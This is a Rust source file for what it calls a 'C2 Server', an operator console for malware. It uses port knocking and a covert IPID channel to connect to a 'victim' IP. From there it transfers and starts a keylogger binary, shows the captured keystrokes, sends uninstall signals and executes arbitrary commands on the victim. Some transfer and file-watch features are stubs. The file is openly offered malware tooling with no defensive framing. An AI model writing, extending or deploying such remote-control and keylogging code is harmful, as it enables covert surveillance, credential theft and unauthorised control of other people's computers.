use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr}; // Fixed import
use std::thread;
use std::time::Duration;
use pnet::datalink;

// Module declarations
mod port_knkr;
mod pcap_capture;
mod keylogger;
mod covert;

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;

// Command Codes for Covert IPID Channel
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF: u8            = 0x41;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    pcap_handle: Option<PcapHandle>,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            knock_session: None,
            pcap_handle: None,
        }
    }

    pub fn run(&mut self) {
        println!("=== C2 Server ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n--- Status: Offline ---");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");

        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Status: Connected to {} ---", self.victim_ip.unwrap());
        println!("1)  Disconnect from victim");
        println!("2)  Uninstall from victim");
        println!("3)  Transfer keylogger to victim");
        println!("4)  Start keylogger");
        println!("5)  Stop keylogger");
        println!("6)  View Captured Keys (from local log)");
        println!("7)  Transfer file TO victim");
        println!("8)  Transfer file FROM victim");
        println!("9)  Watch file");
        println!("10) Watch directory");
        println!("11) Run program on victim");

        match prompt("Selection > ").as_str() {
            "1"  => self.disconnect(),
            "2"  => self.uninstall(),
            "3"  => self.transfer_keylogger(),
            "4"  => self.start_keylogger(),
            "5"  => self.stop_keylogger(),
            "6"  => self.view_keylog(),
            "7"  => self.transfer_to(),
            "8"  => self.transfer_from(),
            "9"  => self.watch_file(),
            "10" => self.watch_dir(),
            "11" => self.run_program(),
            _    => println!("[!] Invalid selection"),
        }
    }

    // Helper: Dynamically find the best interface for a target IP
    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
        let interfaces = datalink::interfaces();
        for iface in interfaces {
            if !iface.is_up() || iface.is_loopback() { continue; }
            for ip_net in &iface.ips {
                match ip_net.ip() {
                    IpAddr::V4(_) => {
                        if ip_net.contains(IpAddr::V4(target_ip)) {
                            return Some(iface.name);
                        }
                    }
                    _ => continue,
                }
            }
        }
        // Fallback to first active physical interface
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }

    fn initiate_connection(&mut self) {
        let mut ip_input = prompt("Enter target Victim IP [0.0.0.0]: ");
        
        // Handle default value
        if ip_input.is_empty() {
            ip_input = "0.0.0.0".to_string();
        }

        match ip_input.parse::<Ipv4Addr>() {
            Ok(ip) => {
                self.victim_ip = Some(ip);
                
                let iface_name = Self::find_best_interface(ip).unwrap_or_else(|| "lo".to_string());
                println!("[*] Dynamic interface selection: {}", iface_name);

                println!("[*] Starting PCAP listener on {}...", iface_name);
                self.pcap_handle = Some(PcapHandle::start(&iface_name, ip.to_string()));

                println!("[*] Executing knocking sequence...");
                match port_knkr::port_knock(ip) {
                    Ok(session) => {
                        println!("[+] Port knock successful. Control port: {}", session.control_port);
                        self.knock_session = Some(session);
                        self.state = SessionState::Connected;
                    }
                    Err(e) => println!("[!] Knock failed: {}", e),
                }
            }
            Err(_) => println!("[!] Invalid IP address format."),
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Closing session...");
        if let Some(session) = &self.knock_session {
            session.stop();
        }
        self.knock_session = None;
        self.pcap_handle = None;
        self.state = SessionState::Disconnected;
    }

    fn transfer_keylogger(&self) {
        if let Some(ip) = self.victim_ip {
            // No build command here—we assume you've already built it!

            // 1. Define where to look (Release first, then Debug)
            let paths = ["target/release/keylogger_bin", "target/debug/keylogger_bin"];
            let mut data = None;

            // 2. Try to find the binary
            for path in paths {
                if let Ok(bytes) = std::fs::read(path) {
                    data = Some(bytes);
                    println!("[*] Found binary at: {}", path);
                    break;
                }
            }

            // 3. Handle the file data
            let data = match data {
                Some(d) => d,
                None => {
                    println!("[!] Error: keylogger_bin not found in target/debug or target/release.");
                    println!("[*] Make sure you ran 'cargo build --release' before transferring.");
                    return;
                }
            };

            println!("[*] Transferring keylogger ({} bytes)...", data.len());
            let mut transmitter = covert::CovertChannel::new(ip);

            // Signal the start of a transfer
            transmitter.send_byte(CMD_START_TRANSFER);
            thread::sleep(Duration::from_millis(200));

            for (i, byte) in data.iter().enumerate() {
                transmitter.send_byte(*byte);
                // Maintain throttle for reliability over raw sockets
                thread::sleep(Duration::from_micros(100)); 

                if i % 1000 == 0 { // Increased interval for cleaner output
                    print!("\r[*] Progress: {}/{}", i, data.len());
                    io::stdout().flush().unwrap();
                }
            }

            transmitter.send_byte(CMD_EOF);
            println!("\n[+] Transfer complete.");
        }
    }

    fn start_keylogger(&self) {
        if let Some(ip) = self.victim_ip {
            println!("[*] Sending 'START' signal...");
            let mut transmitter = covert::CovertChannel::new(ip);
            transmitter.send_byte(CMD_START_LOGGER);
            println!("[+] Keylogger execution triggered.");
        }
    }

    fn stop_keylogger(&self) {
        if let Some(ip) = self.victim_ip {
            println!("[*] Sending 'STOP' signal...");
            let mut transmitter = covert::CovertChannel::new(ip);
            transmitter.send_byte(CMD_STOP_LOGGER);
            println!("[+] Stop command sent.");
        }
    }

    fn view_keylog(&self) {
        println!("\n--- Captured Keystrokes (Local Log) ---");
        match std::fs::read_to_string("captured_keys.txt") {
            Ok(content) => println!("{}", content),
            Err(_) => println!("[!] No keylog data found."),
        }
    }

    fn uninstall(&self) { 
        if let Some(ip) = self.victim_ip {
            let mut transmitter = covert::CovertChannel::new(ip);
            transmitter.send_byte(CMD_UNINSTALL);
            println!("[*] Uninstall command sent."); 
        }
    }

    fn transfer_to(&self) { println!("[*] File transfer TO victim not yet implemented."); }
    fn transfer_from(&self) { println!("[*] Requesting file from victim..."); }
    fn watch_file(&self) { println!("[*] Monitoring file..."); }
    fn watch_dir(&self) { println!("[*] Monitoring directory..."); }

    fn run_program(&self) {
        if let Some(ip) = self.victim_ip {
            let cmd = prompt("Command to run: ");
            println!("[*] Sending '{}' via covert channel...", cmd);
            
            let mut transmitter = covert::CovertChannel::new(ip);
            
            // 1. Send each character of the command
            for byte in cmd.as_bytes() {
                transmitter.send_byte(*byte);
                thread::sleep(Duration::from_millis(5)); // Small delay for reliability
            }
            
            // 2. Send a newline to tell the victim to execute
            transmitter.send_byte(b'\n');
            println!("[+] Command sent. Results should appear in the PCAP/Console.");
        }
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
